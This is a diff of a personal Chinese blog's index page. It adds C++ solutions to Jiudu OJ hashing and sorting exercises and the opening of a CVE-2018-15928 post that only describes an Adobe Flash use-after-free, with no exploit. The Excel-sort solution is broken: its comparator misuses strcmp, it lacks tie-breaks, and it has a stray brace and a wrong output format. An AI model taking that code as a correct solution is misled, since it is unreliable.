@@ -195,7 +195,7 @@
   </div>
 
   <div class="site-nav-toggle">
-    <button aria-label="Navigationsleiste an/ausschalten">
+    <button aria-label="Toggle navigation bar">
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
@@ -223,7 +223,7 @@
 
     
 
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Accueil</a>
 
   </li>
         
@@ -240,7 +240,7 @@
 
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
 
   </li>
 
@@ -276,6 +276,1099 @@
           <div id="content" class="content">
             
   <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/19/hash类问题/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xnightmare">
+      <meta itemprop="description" content="爱看玄幻小说 爱胡思乱想 想成为侠客">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xnightmare's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/08/19/hash类问题/" class="post-title-link" itemprop="url">hash类问题</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posté le</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2019-08-19 00:00:00 / Updated at: 22:15:24" itemprop="dateCreated datePublished" datetime="2019-08-19T00:00:00+08:00">2019-08-19</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/机试/" itemprop="url" rel="index"><span itemprop="name">机试</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="hash类问题"><a href="#hash类问题" class="headerlink" title="hash类问题"></a>hash类问题</h1><h2 id="九度OJ-谁是你的潜在朋友"><a href="#九度OJ-谁是你的潜在朋友" class="headerlink" title="九度OJ-谁是你的潜在朋友"></a>九度OJ-谁是你的潜在朋友</h2><p><strong>题目描述：</strong></p>
+<p> “臭味相投”——这是我们描述朋友时喜欢用的词汇。两个人是朋友通常意味着他们存在着许多共同的兴趣。然而作为一个宅男，你发现自己与他人相互了解的机会并不太多。幸运的是，你意外得到了一份北大图书馆的图书借阅记录，于是你挑灯熬夜地编程，想从中发现潜在的朋友。</p>
+<p>首先你对借阅记录进行了一番整理，把N个读者依次编号为1,2,…,N，把M本书依次编号为1,2,…,M。同时，按照“臭味相投”的原则，和你喜欢读同一本书的人，就是你的潜在朋友。你现在的任务是从这份借阅记录中计算出每个人有几个潜在朋友。</p>
+<p><strong>输入：</strong></p>
+<p>每个案例第一行两个整数N,M，2 &lt;= N ，M&lt;= 200。接下来有N行，第i(i = 1,2,…,N)行每一行有一个数，表示读者i-1最喜欢的图书的编号P(1&lt;=P&lt;=M)</p>
+<p><strong>输出：</strong></p>
+<p>每个案例包括N行，每行一个数，第i行的数表示读者i有几个潜在朋友。如果i和任何人都没有共同喜欢的书，则输出“BeiJu”（即悲剧，^ ^）</p>
+<p><strong>样例输入：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4  5</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">2</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+<p><strong>样例输出：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">BeiJu</span><br><span class="line">1</span><br><span class="line">BeiJu</span><br></pre></td></tr></table></figure>
+<p><strong>代码：</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> students[<span class="number">10001</span>];</span><br><span class="line">    <span class="keyword">int</span> n, m;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;n, &amp;m) != EOF)&#123;</span><br><span class="line">        <span class="keyword">int</span> books[<span class="number">201</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;n; i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;students[i+<span class="number">1</span>]);</span><br><span class="line">            books[students[i+<span class="number">1</span>]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;n; i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = books[students[i+<span class="number">1</span>]] - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(tmp == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"BeiJu\n"</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, tmp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="九度OJ-剩下的树"><a href="#九度OJ-剩下的树" class="headerlink" title="九度OJ-剩下的树"></a>九度OJ-剩下的树</h2><p><strong>题目描述：</strong></p>
+<p>有一个长度为整数L(1&lt;=L&lt;=10000)的马路，可以想象成数轴上长度为L的一个线段，起点是坐标原点，在每个整数坐标点有一棵树，即在0,1,2，…，L共L+1个位置上有L+1棵树。</p>
+<p>现在要移走一些树，移走的树的区间用一对数字表示，如 100 200表示移走从100到200之间（包括端点）所有的树。</p>
+<p>可能有M(1&lt;=M&lt;=100)个区间，区间之间可能有重叠。现在要求移走所有区间的树之后剩下的树的个数。</p>
+<p><strong>输入：</strong></p>
+<p>两个整数L(1&lt;=L&lt;=10000)和M(1&lt;=M&lt;=100)。</p>
+<p>接下来有M组整数，每组有一对数字。</p>
+<p><strong>输出：</strong></p>
+<p>可能有多组输入数据，对于每组输入数据，输出一个数，表示移走所有区间的树之后剩下的树的个数。</p>
+<p><strong>样例输入：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">500 3</span><br><span class="line">100 200</span><br><span class="line">150 300</span><br><span class="line">470 471</span><br></pre></td></tr></table></figure>
+<p><strong>样例输出：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">298</span><br></pre></td></tr></table></figure>
+<p><strong>代码：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line">int trees[10001];</span><br><span class="line"></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()&#123;</span><br><span class="line">    int l, m;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">"%d %d"</span>, &amp;l, &amp;m) != EOF)&#123;</span><br><span class="line">        <span class="keyword">for</span>(int i=0; i&lt;l+1; i++)&#123;</span><br><span class="line">            trees[i] = 1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(int i=0; i&lt;m; i++)&#123;</span><br><span class="line">            int start, end;</span><br><span class="line">            scanf(<span class="string">"%d %d"</span>, &amp;start, &amp;end);</span><br><span class="line">            <span class="keyword">for</span>(int j=start; j&lt;=end; j++)&#123;</span><br><span class="line">                trees[j] = 0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        int trees_num = 0;</span><br><span class="line">        <span class="keyword">for</span>(int i=0; i&lt;l+1; i++)&#123;</span><br><span class="line">            trees_num += trees[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, trees_num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/19/排序问题/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xnightmare">
+      <meta itemprop="description" content="爱看玄幻小说 爱胡思乱想 想成为侠客">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xnightmare's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/08/19/排序问题/" class="post-title-link" itemprop="url">排序问题</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posté le</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2019-08-19 00:00:00 / Updated at: 22:14:24" itemprop="dateCreated datePublished" datetime="2019-08-19T00:00:00+08:00">2019-08-19</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/机试/" itemprop="url" rel="index"><span itemprop="name">机试</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="排序问题"><a href="#排序问题" class="headerlink" title="排序问题"></a>排序问题</h1><h2 id="九度OJ-特殊排序"><a href="#九度OJ-特殊排序" class="headerlink" title="九度OJ-特殊排序"></a>九度OJ-特殊排序</h2><p><strong>题目描述：</strong><br>输入一系列整数，将其中最大的数挑出，并将剩下的数进行排序。</p>
+<p><strong>输入：</strong><br>输入第一行包括1个整数N，1&lt;=N&lt;=1000，代表输入数据的个数。<br>接下来的一行有N个整数。</p>
+<p><strong>输出：</strong><br>可能有多组测试数据，对于每组数据，<br>第一行输出一个整数，代表N个整数中的最大值，并将此值从数组中去除，将剩下的数进行排序。<br>第二行将排序的结果输出。</p>
+<p><strong>样例输入：</strong><br>4<br>1 3 4 2</p>
+<p><strong>样例输出：</strong><br>4<br>1 2 3</p>
+<p><strong>提示：</strong><br>如果数组中只有一个数，当第一行将其输出后，第二行请输出”-1”。</p>
+<p><strong>代码：</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> buf[<span class="number">1000</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n)!=EOF)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;n; i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;buf[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, buf[<span class="number">0</span>]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"-1\n"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            sort(buf, buf+n);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, buf[n<span class="number">-1</span>]);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d "</span>, buf[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="九度OJ-EXCEL排序"><a href="#九度OJ-EXCEL排序" class="headerlink" title="九度OJ-EXCEL排序"></a>九度OJ-EXCEL排序</h2><p><strong>题目描述：</strong></p>
+<p>Excel可以对一组纪录按任意指定列排序。现请你编写程序实现类似功能。</p>
+<p>对每个测试用例，首先输出1行“Case i:”，其中 i 是测试用例的编号（从1开始）。随后在 N 行中输出按要求排序后的结果，即：当 C=1 时，按学号递增排序；当 C=2时，按姓名的非递减字典序排序；当 C=3时，按成绩的非递减排序。当若干学生具有相同姓名或者相同成绩时，则按他们的学号递增排序。</p>
+<p><strong>输入：</strong></p>
+<p>测试输入包含若干测试用例。每个测试用例的第1行包含两个整数 N (N&lt;=100000) 和 C，其中 N 是纪录的条数，C 是指定排序的列号。以下有N行，每行包含一条学生纪录。每条学生纪录由学号（6位数字，同组测试中没有重复的学号）、姓名（不超过8位且不包含空格的字符串）、成绩（闭区间[0, 100]内的整数）组成，每个项目间用1个空格隔开。当读到 N=0 时，全部输入结束，相应的结果不要输出。</p>
+<p><strong>输出：</strong></p>
+<p>对每个测试用例，首先输出1行“Case i:”，其中 i 是测试用例的编号（从1开始）。随后在 N 行中输出按要求排序后的结果，即：当 C=1 时，按学号递增排序；当 C=2时，按姓名的非递减字典序排序；当 C=3时，按成绩的非递减排序。当若干学生具有相同姓名或者相同成绩时，则按他们的学号递增排序。</p>
+<p><strong>样例输入：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">3 1</span><br><span class="line">000007 James 85</span><br><span class="line">000010 Amy 90</span><br><span class="line">000001 Zoe 60</span><br><span class="line">4 2</span><br><span class="line">000007 James</span><br><span class="line">000010 Amy 90</span><br><span class="line">000001 Zoe 60</span><br><span class="line">000002 James 98</span><br><span class="line">4 3</span><br><span class="line">000007 James 85</span><br><span class="line">000010 Amy 90</span><br><span class="line">000001 Zoe 60</span><br><span class="line">000002 James 90</span><br><span class="line">0 0</span><br></pre></td></tr></table></figure>
+<p><strong>样例输出：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Case 1:</span><br><span class="line">000001 Zoe 60</span><br><span class="line">000007 James 85</span><br><span class="line">000010 Amy 90</span><br><span class="line">Case 2:</span><br><span class="line">000010 Amy 90</span><br><span class="line">000002 James 98</span><br><span class="line">000007 James 85</span><br><span class="line">000001 Zoe 60</span><br><span class="line">Case 3:</span><br><span class="line">000001 Zoe 60</span><br><span class="line">000007 James 85</span><br><span class="line">000002 James 90</span><br><span class="line">000010 Amy 90</span><br></pre></td></tr></table></figure>
+<p><strong>代码：</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">9</span>];</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">&#125;students[<span class="number">100000</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> c;</span><br><span class="line"><span class="keyword">int</span> case_num=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(Student a, Student b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(c == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> a.num &lt; b.num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(c == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">strcmp</span>(a.name, b.name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(c == <span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> a.score &lt; b.score;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;c);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;n; i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;students[i].num);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%s"</span>, students[i].name);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;students[i].score);</span><br><span class="line">        &#125;</span><br><span class="line">        sort(students, students+n, cmp);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Case %d\n"</span>, case_num);</span><br><span class="line">        case_num++;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;n; i++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%06d %s %d\n"</span>, students[i].num, students[i].name, students[i].score);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d\n"</span>, &amp;n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="九度OJ-字符串内排序"><a href="#九度OJ-字符串内排序" class="headerlink" title="九度OJ-字符串内排序"></a>九度OJ-字符串内排序</h2><p><strong>题目描述：</strong></p>
+<p>输入一个字符串，长度小于等于200，然后将输出按字符顺序升序排序后的字符串。</p>
+<p><strong>输入：</strong></p>
+<p>测试数据有多组，输入字符串。</p>
+<p><strong>输出：</strong></p>
+<p>对于每组输入,输出处理后的结果。</p>
+<p><strong>样例：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：</span><br><span class="line">bacd</span><br><span class="line">输出：</span><br><span class="line">abcd</span><br></pre></td></tr></table></figure>
+<p><strong>代码：</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">201</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%s"</span>, str) != EOF)&#123;</span><br><span class="line">        sort(str, str+<span class="built_in">strlen</span>(str));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/06/CVE-2018-15928-漏洞复现/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xnightmare">
+      <meta itemprop="description" content="爱看玄幻小说 爱胡思乱想 想成为侠客">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xnightmare's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/08/06/CVE-2018-15928-漏洞复现/" class="post-title-link" itemprop="url">CVE-2018-15928 漏洞复现</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posté le</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2019-08-06 21:58:51 / Updated at: 21:59:50" itemprop="dateCreated datePublished" datetime="2019-08-06T21:58:51+08:00">2019-08-06</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/杂项/" itemprop="url" rel="index"><span itemprop="name">杂项</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Adobe Flash Player的版本：</p>
+<ul>
+<li>Adobe Flash Player &lt;= 31.0.0.153</li>
+<li>Adobe Flash Player Installer&lt;= 31.0.0.108</li>
+</ul>
+<p>中存在UAF漏洞，该漏洞允许攻击者恶意制作的Flash对象在受害者的计算机上执行代码，从而获取对系统命令行的访问权限。</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>没详细研究</p>
